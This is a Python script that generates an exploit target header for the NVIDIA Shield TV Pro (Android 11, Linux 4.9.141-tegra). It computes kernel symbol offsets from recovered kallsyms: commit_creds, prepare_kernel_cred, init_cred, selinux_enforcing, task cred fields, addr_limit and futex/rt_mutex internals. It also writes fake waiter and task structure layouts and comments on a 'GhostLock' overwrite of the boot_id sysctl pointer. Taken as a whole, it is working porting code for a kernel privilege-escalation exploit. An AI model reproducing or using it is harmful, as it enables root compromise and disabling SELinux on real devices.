#!/usr/bin/env python3
"""Generate the mdarcy 9.2.4 target header from recovered kallsyms.

The input is GNU nm output from the vmlinux reconstructed from the official
9.2.4 boot image.  Structure values are from NVIDIA's 9.2.2 source built with
the 9.2.4 IKCONFIG, with the four PI offsets corrected from 9.2.4 machine code.
"""

from pathlib import Path
import re
import sys

BASE = 0xFFFFFF8008080000


def load_symbols(path: Path) -> dict[str, int]:
    symbols: dict[str, int] = {}
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        fields = line.split()
        if len(fields) >= 3 and re.fullmatch(r"[0-9a-fA-F]+", fields[0]):
            symbols[fields[-1]] = int(fields[0], 16)
    return symbols


def main() -> None:
    if len(sys.argv) != 3:
        raise SystemExit("usage: generate_mdarcy_target.py NM_FILE TARGET_H")
    symbols = load_symbols(Path(sys.argv[1]))
    target = Path(sys.argv[2])
    text = target.read_text(encoding="utf-8")

    symbol_macros = {
        "COMMIT_CREDS_OFF": "commit_creds",
        "PREPARE_KERNEL_CRED_OFF": "prepare_kernel_cred",
        "OVERRIDE_CREDS_OFF": "override_creds",
        "GET_TASK_CRED_OFF": "get_task_cred",
        "INIT_TASK_OFF": "init_task",
        "INIT_UTS_NS_OFF": "init_uts_ns",
        "INIT_CRED_OFF": "init_cred",
        "INIT_USER_NS_OFF": "init_user_ns",
        "INIT_GROUPS_OFF": "init_groups",
        "MEMSTART_ADDR_OFF": "memstart_addr",
        "MODULE_ALLOC_BASE_OFF": "module_alloc_base",
        "RESERVED_MEM_OFF": "reserved_mem",
        "EMPTY_ZERO_PAGE_OFF": "empty_zero_page",
        "ROOT_TASK_GROUP_OFF": "root_task_group",
        "KPTR_RESTRICT_OFF": "kptr_restrict",
        "SYSCALL_BOOTID_OFF": "sysctl_bootid",
        "NFULNL_LOGGER_OFF": "nfulnl_logger",
        "LOGGERS_0_1_OFF": "loggers",
        "ASHMEM_MISC_FOPS_OFF": "ashmem_misc",
        "ASHMEM_FOPS_OFF": "ashmem_fops",
        "ASHMEM_MISC_OFF": "ashmem_misc",
        "ASHMEM_IOCTL_OFF": "ashmem_ioctl",
        "ASHMEM_MMAP_OFF": "ashmem_mmap",
        "ASHMEM_OPEN_OFF": "ashmem_open",
        "ASHMEM_RELEASE_OFF": "ashmem_release",
        "ASHMEM_READ_ITER_OFF": "ashmem_read",
        "ASHMEM_LLSEEK_OFF": "ashmem_llseek",
        "NOOP_LLSEEK_OFF": "noop_llseek",
        "GENERIC_FILE_LLSEEK_OFF": "generic_file_llseek",
        "GENERIC_FILE_SPLICE_READ_OFF": "generic_file_splice_read",
        "DEFAULT_FILE_SPLICE_READ_OFF": "default_file_splice_read",
        "KERNEL_WRITE_OFF": "kernel_write",
        "FGET_OFF": "fget",
        "FPUT_OFF": "fput",
        "SYS_IOCTL_OFF": "sys_ioctl",
        "CONFIGFS_READ_FILE_OFF": "configfs_read_file",
        "CONFIGFS_WRITE_FILE_OFF": "configfs_write_file",
        "CONFIGFS_READ_BIN_FILE_OFF": "configfs_read_bin_file",
        "CONFIGFS_WRITE_BIN_FILE_OFF": "configfs_write_bin_file",
        "CONFIGFS_OPEN_BIN_FILE_OFF": "configfs_open_bin_file",
        "CONFIGFS_RELEASE_BIN_FILE_OFF": "configfs_release_bin_file",
        "KMALLOC_CACHES_OFF": "kmalloc_caches",
        "ANON_PIPE_BUF_OPS_OFF": "anon_pipe_buf_ops",
        "ANON_PIPE_BUF_NOMERGE_OPS_OFF": "anon_pipe_buf_ops",
        "SELINUX_STATE_OFF": "selinux_enforcing",
        "SELINUX_ENFORCING_BOOT_OFF": "selinux_enforcing",
        "SECURITY_HOOK_HEADS_OFF": "security_hook_heads",
        "RT_MUTEX_START_PROXY_LOCK_OFF": "rt_mutex_start_proxy_lock",
        "REMOVE_WAITER_OFF": "remove_waiter",
        "RT_MUTEX_SLOWLOCK_OFF": "rt_mutex_slowlock",
        "RT_MUTEX_SETPRIO_OFF": "rt_mutex_setprio",
        "FUTEX_REQUEUE_OFF": "futex_requeue",
        "FUTEX_LOCK_PI_OFF": "futex_lock_pi",
        "FUTEX_WAKE_OFF": "futex_wake",
        "KALLSYMS_LOOKUP_NAME_OFF": "kallsyms_lookup_name",
        # loggers is struct nf_logger *[NFPROTO_NUMPROTO][NF_LOG_TYPE_MAX].
        # The value is replaced below with the final ULOG slot.  It contains
        # the same &nfulnl_logger pointer as [0][1], but rb_erase's collateral
        # child store then lands in the alignment padding after the array.
        "SLIDE_LOGGERS_0_1_OFF": "loggers",
        "SLIDE_NFULNL_LOGGER_OFF": "nfulnl_logger",
        # This is not the sysctl_bootid byte array.  GhostLock overwrites the
        # .data pointer in random_table's boot_id ctl_table entry.  On this
        # arm64 4.9 build sizeof(struct ctl_table) is 0x40, boot_id is entry 5,
        # and data is the second pointer-sized field (+0x08).
        "SLIDE_RANDOM_BOOT_ID_DATA_OFF": "random_table",
        "SLIDE_SYSCTL_BOOTID_OFF": "sysctl_bootid",
        "SLIDE_INIT_TASK_OFF": "init_task",
        "SLIDE_ROOT_TASK_GROUP_OFF": "root_task_group",
    }

    values: dict[str, str] = {
        name: f"0x{symbols[sym] - BASE:08x}ULL"
        for name, sym in symbol_macros.items()
    }
    values["SLIDE_RANDOM_BOOT_ID_DATA_OFF"] = (
        f"0x{symbols['random_table'] + 5 * 0x40 + 0x08 - BASE:08x}ULL"
    )
    # struct miscdevice: minor@0, name@8, mutable fops pointer@0x10.
    values["ASHMEM_MISC_FOPS_OFF"] = (
        f"0x{symbols['ashmem_misc'] + 0x10 - BASE:08x}ULL"
    )
    # 4.9 UAPI: NFPROTO_NUMPROTO=13, NF_LOG_TYPE_MAX=2, ULOG=1.
    safe_ulog_slot = symbols["loggers"] + ((13 - 1) * 2 + 1) * 8
    values["SLIDE_LOGGERS_0_1_OFF"] = (
        f"0x{safe_ulog_slot - BASE:08x}ULL"
    )
    # compat_ioctl is present in ashmem_fops but stripped from kallsyms.
    values["ASHMEM_COMPAT_IOCTL_OFF"] = f"0x{0xFFFFFF8008C28844 - BASE:08x}ULL"
    values["MARK_WAKEUP_NEXT_WAITER_OFF"] = "0x00000000ULL /* inlined on 4.9 */"

    values.update({
        "KIMAGE_TEXT_BASE": "0xffffff8008080000ULL",
        "P0_PAGE_OFFSET": "0xffffffc000000000ULL",
        "P0_PHYS_OFFSET": "0x80000000ULL",
        "P0_KERNEL_PHYS_LOAD": "0x80080000ULL",
        "KERNELSNITCH_IDENTITY_START": "0xffffffc000000000ULL",
        "KERNELSNITCH_IDENTITY_END": "0xffffffc100000000ULL",
        "DIRECT_MAP_BASE": "0xffffffc000000000ULL",
        "DIRECT_MAP_END": "0xffffffc100000000ULL",
        "VMEMMAP_START": "0xffffffbf00000000ULL",
        "PSELECT_WAITER_WORD_SHIFT": "2",
        "TASK_PI_USES_LEFTMOST": "1",
        "CONFIGFS_BUFFER_HAS_CB_MAX": "0",
        "SELINUX_ENFORCING": "(KIMAGE_TEXT_BASE + 0x01c1c980ULL)",
        "SELINUX_BLOB_SIZES": "(KIMAGE_TEXT_BASE + 0x01c1c980ULL)",
        "FAKE_WAITER_TREE_ENTRY_OFF": "0x00",
        "FAKE_WAITER_TREE_PRIO_OFF": "0x40",
        "FAKE_WAITER_TREE_DEADLINE_OFF": "0x48",
        "FAKE_WAITER_PI_TREE_ENTRY_OFF": "0x18",
        "FAKE_WAITER_PI_TREE_PRIO_OFF": "0x40",
        "FAKE_WAITER_PI_TREE_DEADLINE_OFF": "0x48",
        "FAKE_WAITER_TASK_OFF": "0x30",
        "FAKE_WAITER_LOCK_OFF": "0x38",
        "FAKE_WAITER_WAKE_STATE_OFF": "0x50",
        "FAKE_WAITER_WW_CTX_OFF": "0x58",
        "FAKE_TASK_USAGE_OFF": "48",
        "FAKE_TASK_PRIO_OFF": "112",
        "FAKE_TASK_NORMAL_PRIO_OFF": "120",
        "FAKE_TASK_TASK_GROUP_OFF": "840",
        "FAKE_TASK_PI_LOCK_OFF": "2020",
        "FAKE_TASK_PI_WAITERS_OFF": "2032",
        "FAKE_TASK_PI_TOP_TASK_OFF": "2040",
        "FAKE_TASK_PI_BLOCKED_ON_OFF": "2048",
        "TASK_PID_OFF": "1368",
        "TASK_TGID_OFF": "1372",
        "TASK_REAL_PARENT_OFF": "1376",
        "TASK_PARENT_OFF": "1384",
        "TASK_TASKS_OFF": "1112",
        "TASK_THREAD_GROUP_OFF": "1536",
        "TASK_MM_OFF": "1192",
        "TASK_ACTIVE_MM_OFF": "1200",
        "TASK_REAL_CRED_OFF": "1808",
        "TASK_CRED_OFF": "1816",
        "TASK_COMM_OFF": "1824",
        "TASK_FILES_OFF": "1864",
        "TASK_NSPROXY_OFF": "1872",
        "TASK_SIGNAL_OFF": "1880",
        "TASK_THREAD_OFF": "2520",
        "TASK_STACK_OFF": "40",
        "TASK_PI_LOCK_OFF": "2020",
        "TASK_PI_WAITERS_OFF": "2032",
        "TASK_PI_TOP_TASK_OFF": "2040",
        "TASK_PI_BLOCKED_ON_OFF": "2048",
        "TASK_ATOMIC_FLAGS_OFF": "1312",
        "TASK_PRIO_OFF": "112",
        "TASK_STATIC_PRIO_OFF": "116",
        "TASK_NORMAL_PRIO_OFF": "120",
        "TASK_RT_PRIORITY_OFF": "124",
        "TASK_SIZE": "3528",
        "TASK_SECCOMP_OFF": "1992",
        "THREAD_INFO_FLAGS_OFF": "0x00",
        "THREAD_INFO_ADDR_LIMIT_OFF": "0x08",
        "THREAD_INFO_PREEMPT_OFF": "0x18",
        "PIPE_INODE_INFO_STRUCT_SIZE": "0x90",
        "PIPE_INODE_INFO_SIZE": "0x90",
        "PIPE_NRB_UFS_OFF": "0x40",
        "PIPE_CURBUF_OFF": "0x44",
        "PIPE_BUFFERS_OFF": "0x48",
        "PIPE_READERS_OFF": "0x4c",
        "PIPE_WRITERS_OFF": "0x50",
        "PIPE_FILES_OFF": "0x54",
        "PIPE_TMP_PAGE_OFF": "0x68",
        "PIPE_BUFS_OFF": "0x80",
        "PIPE_USER_OFF": "0x88",
        "FILE_F_MAPPING_OFF": "248",
        "INODE_I_FOP_OFF": "360",
        "SEQ_FILE_OP_OFF": "104",
        "SEQ_FILE_PRIVATE_OFF": "128",
        "MM_CONTEXT_ID_OFF": "720",
        "MM_OWNER_OFF": "768",
        "STRUCT_PAGE_COMPOUND_HEAD_OFF": "0x20",
        "STRUCT_PAGE_TYPE_OFF": "0x18",
        "STRUCT_SLAB_CACHE_OFF": "0x30",
        "CFG_COUNT_OFF": "0x00",
        "CFG_POS_OFF": "0x08",
        "CFG_PAGE_OFF": "0x10",
        "CFG_OPS_OFF": "0x18",
        "CFG_MUTEX_OFF": "0x20",
        "CFG_MUTEX_COUNT_OFF": "0x20",
        "CFG_MUTEX_WAIT_LOCK_OFF": "0x24",
        "CFG_MUTEX_WAIT_LIST_OFF": "0x28",
        "CFG_MUTEX_OWNER_OFF": "0x38",
        "CFG_MUTEX_OSQ_OFF": "0x40",
        "CFG_NEEDS_READ_FILL_OFF": "0x48",
        "CFG_READ_IN_PROGRESS_OFF": "0x4c",
        "CFG_WRITE_IN_PROGRESS_OFF": "0x4d",
        "CFG_BIN_BUFFER_OFF": "0x50",
        "CFG_BIN_BUFFER_SIZE_OFF": "0x58",
        "CFG_CB_MAX_SIZE_OFF": "0x5c",
    })

    for name, value in values.items():
        pattern = rf"(?m)^#define\s+{re.escape(name)}\s+.*$"
        replacement = f"#define {name} {value}"
        text, count = re.subn(pattern, replacement, text)
        if count == 0:
            text = text.replace("#define BUILD_VARIANT_LABEL", replacement + "\n#define BUILD_VARIANT_LABEL", 1)

    text = re.sub(r'(?m)^#define BUILD_VARIANT_LABEL .+$',
                  '#define BUILD_VARIANT_LABEL "shield_mdarcy_9.2.4_7825230"', text)
    text = re.sub(r'(?m)^#define BUILD_FINGERPRINT .+$',
                  '#define BUILD_FINGERPRINT "NVIDIA/mdarcy/mdarcy:11/RQ1A.210105.003/7825230_4387.0822:user/release-keys"', text)
    text = text.replace("OPPO PCKM00 (OP4A57) — SM6150, Android 11, Linux 4.14.180-perf+",
                        "NVIDIA Shield TV Pro (mdarcy), Android 11, Linux 4.9.141-tegra")
    target.write_text(text, encoding="utf-8", newline="\n")


if __name__ == "__main__":
    main()
